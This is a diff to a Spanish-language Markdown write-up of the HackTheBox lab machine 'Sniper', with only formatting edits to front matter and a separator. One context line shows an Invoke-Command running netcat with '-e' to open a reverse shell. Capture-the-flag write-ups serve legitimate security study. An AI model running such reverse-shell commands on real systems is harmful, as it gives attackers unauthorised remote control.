@@ -8,7 +8,7 @@ web: https://app.hackthebox.com/machines/211
 dificultad: Media
 ip: 10.10.10.151
 os: Windows
-relacionados:
+linked:
 ---
 # HackTheBox - Sniper
 
@@ -247,7 +247,7 @@ Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e c
 - **PowerShell Remoting (Invoke-Command):** Una poderosa herramienta para ejecutar comandos y verificar credenciales de forma sigilosa en sistemas Windows.
 
 
-___
+---
 
 ## Bandera(s)
 
